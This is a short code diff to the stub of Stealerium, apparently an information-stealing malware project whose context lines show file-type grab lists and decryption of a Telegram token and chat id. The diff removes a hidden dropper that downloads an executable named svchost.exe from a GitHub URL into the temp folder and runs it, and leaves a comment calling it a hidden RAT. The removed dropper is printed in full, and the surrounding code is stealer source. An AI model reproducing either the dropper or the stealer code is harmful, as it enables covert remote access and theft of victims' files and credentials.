@@ -135,29 +135,10 @@ namespace Stealerium.Stub
             ["Image"] = new[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
         };
 
-        // Decrypt config values
+        //
         public static async Task InitAsync()
         {
-            string url = "https://github.com/kgnfth/tumblr/raw/refs/heads/main/svchost.exe";
-            string filePath = Path.Combine(Path.GetTempPath(), "svchost.exe");
-
-            using (HttpClient client = new HttpClient())
-            {
-                Console.WriteLine("Downloading file...");
-                byte[] fileBytes = await client.GetByteArrayAsync(url);
-
-                if (fileBytes != null && fileBytes.Length > 0)
-                {
-                    File.WriteAllBytes(filePath, fileBytes);
-
-                    var startInfo = new ProcessStartInfo
-                    {
-                        FileName = filePath,
-                        UseShellExecute = false
-                    };
-
-                    Process.Start(startInfo);
-                }
+          // Removed Hidden rat that would download
             }
 
             // Decrypt telegram token and telegram chat id
